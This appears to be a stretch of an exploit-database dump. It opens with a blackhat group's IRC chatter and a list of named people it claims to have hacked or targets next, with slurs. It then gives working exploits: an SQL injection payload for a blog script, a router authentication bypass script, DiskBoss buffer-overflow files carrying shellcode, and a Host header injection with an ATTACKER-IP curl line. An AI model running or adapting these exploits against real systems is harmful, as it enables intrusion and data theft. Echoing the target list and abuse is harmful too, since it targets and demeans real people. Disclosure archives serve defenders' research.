#intruders: <query> hi btw
#intruders: <Pagefault> wellcome ;)
#intruders: <query> thanks
#intruders: <query> whats this chan all about anyway?
#intruders: <Pagefault> lols blackhats
#intruders: <query> evil hax0rs
#intruders: <query> !
#intruders: <Pagefault> hahahah yes
#intruders: <Pagefault> fuck evil hax0r in top
#intruders: <Pagefault> haha linuxg0d :P
#intruders: <query> hehe brb celllphoen
#intruders: <query> -l
#intruders: <Pagefault> oky dude
#intruders: <Pagefault> hi tty
#intruders: <Pagefault> r u here
#intruders: <query> ya
#intruders: <query> allmost
#intruders: <query> sleepy
#intruders: <query> and its YET a party day
#intruders: <query> shrugs

// query!! keep out!!! u were hax3rs 2 times!!!


||||||||||||||||||||||||||||||||||||
||||||||||||||TARGETS|||||||||||||||
||||||||||||||||||||||||||||||||||||


(x) -> MGN (we are of eye'in)
(x) -> labsec = el8 pokemon requers

		       ||
		       \/

		klux = picachu;
		include = Eevee;
		deadcow = Kakuna;
		w3b = Meowth;
		fseek = Magnemite;
		xstalin = Slowpoke

(x) -> serh (the power puff girl)
(x) -> themar (w8 for ur time)
(x) -> XgEn (callcenter man)
(x) -> query (2 times owned... we will again)
( ) -> dtr (el8 pokemon - next target)
( ) -> SLY666 (the best requer... love colors - next target)
( ) -> S4P0 (keep el8 pokemon - next target)
( ) -> rogerinho (el8 solaris pokemon jr. - next target) = PACKET KIDDIE MASTER GAY
( ) -> bonny (even though he is a shit... everbody give ass to him - next target)


||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||
||||||||||||||||||||||||||||||||||||



^^^^^^^ ^^^^^^^ ^^^^^^^ ^^^^^^^ 
^^^^^^^ thkx to         ^^^^^^^ 
^^^^^^^                 ^^^^^^^ 
^^^^^^^ all blackhats!  ^^^^^^^ 
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

################################################
#                                              #
#                                              #
#            ÛÛÛÛ             ÛÛÛÛ             #
#           ÛÛ± ÛÛ           ÛÛ± ÛÛ²           #
#  ÛÛÛ  ÛÛ ±ÛÛ  ±Û° °ÛÛ  ÛÛ  ÛÛ  ±ÛÛ °ÛÛ  ÛÛ°  #
#   ÛÛ²ÛÛ  ²ÛÛ  °Û²  °Û²ÛÛ   ÛÛ  °ÛÛ  °Û²ÛÛ°   #
#    ÛÛÛ   ²ÛÛ  °Û±   ÛÛÛ    ÛÛ  °ÛÛ   ÛÛÛ     #
#   °ÛÛÛ±  ±ÛÛ  ±Û°   ÛÛÛ±   ÛÛ  ±ÛÛ   ÛÛÛ±    #
#   ÛÛ°ÛÛ   ÛÛ± ÛÛ   ²Û°ÛÛ   ÛÛ± ÛÛÛ  ²Û°ÛÛ²   #
#  ÛÛ²  ÛÛ   ÛÛÛÛ   ²Û²  ÛÛ   ÛÛÛÛ   ²Û²  ÛÛ²  #
#                                              #
################################################
################################################
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
################################################

//EOF"
Webapps,Easy Blog PHP Script 1.3a - 'id' Parameter SQL Injection,PHP,,2017-09-28,:  N/A                        ,"# Exploit Title: Easy Blog PHP Script v1.3a - SQL Injection
# Date: 2017-09-27
# Exploit Author: 8bitsec
# Vendor Homepage: https://www.codester.com/
# Software Link: https://www.codester.com/items/4616/easy-blog-php-script
# Version: 1.3a
# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
# Email: contact@8bitsec.io
# Contact: https://twitter.com/_8bitsec

Release Date:
=============
2017-09-27

Product & Service Introduction:
===============================
A simple and easy to setup script that allows you to have your own basic blog that comes packed with professional features.

Technical Details & Description:
================================

SQL injection on [id] parameter.

Proof of Concept (PoC):
=======================

SQLi:

http://localhost/[path]/article.php?id=8' AND 7160=7160 AND 'cbgz'='cbgz

Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=8' AND 7160=7160 AND 'cbgz'='cbgz

==================
8bitsec - [https://twitter.com/_8bitsec]"
Webapps,Roteador Wireless Intelbras WRN150 - Autentication Bypass,Hardware,,2017-09-28,:  N/A                        ,"# Exploit Title: Autentication Bypass/Config file download - INTELBRAS WRN
150
# Date: 28/09/2017
# Exploit Author: Elber Tavares
# Vendor Homepage: http://intelbras.com.br/
# Version: Intelbras Wireless N 150 Mbps - WRN 150
# Tested on: kali linux, windows 7, 8.1, 10
For more info:

http://whiteboyz.xyz/authentication-bypass-intelbras-wrn-150.html

URL VULN: http://10.0.0.1/

Download backup file:

Payload: curl --cookie ""Cookie=admin:language=pt""
http://10.0.0.1/cgi-bin/DownloadCfg/RouterCfm.cfg



PoC:

#pip install requests
from requests import get

url = ""http://10.0.0.1/cgi-bin/DownloadCfg/RouterCfm.cfg""
#url do backup
header = {'Cookie': 'admin:language=pt'}
#setando o cookie no header
r = get(url, headers=header).text
print(r)"
Dos,DiskBoss Enterprise 8.4.16 - Local Buffer Overflow (PoC),Windows,,2017-09-28,":  N/A                        ,2016-12-05","#!/usr/bin/python

#========================================================================================================================
# Exploit Author: Touhid M.Shaikh
# Exploit Title: DiskBoss Enterprise v8.4.16 Local Buffer Overflow(PoC)
# Date: 28-09-2017
# Website: www.touhidshaikh.com
# Vulnerable Software: DiskBoss Enterprise v8.4.16
# Vendor Homepage: http://www.diskboss.com
# Version: v8.4.16
# Software Link: http://www.diskboss.com/downloads.html
# Tested On: Windows 7 x86
#
#
# To reproduce the exploit:
#   1. Click Server
#   2. Click Connect
#   3. In the ""Share Name"" field, paste the content of buffer.txt , And try
to connect.........BOOoom....
#
#========================================================================================================================


junk = ""A""*1312

EIP = ""B""*4 #EIP overwritten

b = junk+EIP+""D""*500

f = open('buffer.txt','w')
f.write(b)
f.close()"
Webapps,Trend Micro OfficeScan 11.0/XG (12.0) - 'Host' Header Injection,PHP,,2017-09-28,":                                     ,
                                                                                            ,2017-09-28","[+] Credits: John Page (aka hyp3rlinx)	
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/CVE-2017-14087-TRENDMICRO-OFFICESCAN-XG-HOST-HEADER-INJECTION.txt
[+] ISR: ApparitionSec            
 


Vendor:
==================
www.trendmicro.com



Product:
========
OfficeScan 
v11.0 and XG (12.0)*


OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.



Vulnerability Type:
===================
Host Header Injection



CVE Reference:
==============
CVE-2017-14087



Security Issue:
================
Host header injection issue as ""db_controller.php"" relies on $_SERVER['HTTP_HOST'] which can be spoofed by client, instead of $_SERVER['SERVER_NAME'].
In environments where caching is in place by making HTTP GET request with a poisoned HOST header webpages can potentially render arbitrary
links that point to a malicious website.


Exploit/POC:
=============

c:\> CURL http://x.x.x.x -H ""Host: ATTACKER-IP""



Network Access:
===============
Remote




Severity:
=========
Medium



Disclosure Timeline:
==================================
Vendor Notification:  June 2, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx"
Local,DiskBoss Enterprise 8.4.16 - 'Import Command' Buffer Overflow,Windows,,2017-09-28,":  N/A                        ,2016-12-05","#!/usr/bin/python

#========================================================================================================================
# Exploit Author: Touhid M.Shaikh
# Exploit Title: DiskBoss Enterprise v8.4.16 ""Import Command"" Buffer
Overflow
# Date: 29-09-2017
# Website: www.touhidshaikh.com
# Contact: https://github.com/touhidshaikh
# Vulnerable Software: DiskBoss Enterprise v8.4.16
# Vendor Homepage: http://www.diskboss.com
# Version: v8.4.16
# Software Link: http://www.diskboss.com/downloads.html
# Tested On: Windows 7 x86
#
#
# To reproduce the exploit:
#   1. right Click, click on Import Command
#   2. select evil.xml , Booom Calc POPED up.. ;)
#========================================================================================================================


import os,struct
import sys

#offset to eip
junk = ""A"" * (1560)

#JMP ESP (QtGui4.dll)
jmp1 = struct.pack('<L',0x651bb77a)

#NOPS
nops = ""\x90""

#LEA   EAX, [ESP+76]
esp = ""\x8D\x44\x24\x4c""

#JMP ESP
jmp2 = ""\xFF\xE0""

#Jump short 5
nseh = ""\x90\x90\xEB\x05""

#POP POP RET
seh = struct.pack('<L',0x6501DE41)

#CALC.EXE pop shellcode
shellcode =
""\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7""


# FINAL PAYLOAD
buf = junk + jmp1 + nops * 16 + esp + jmp2 + nops * 90 + nseh + seh + nops
* 10 + shellcode


#FILE
file='<?xml version=""1.0"" encoding=""UTF-8""?>\n<classify\nname=\'' + buf +
'\n</classify>'


f = open('evil.xml', 'w')
f.write(file)
f.close()

#GREETZ ----------
#Taushif(Brother)
#-----------------"
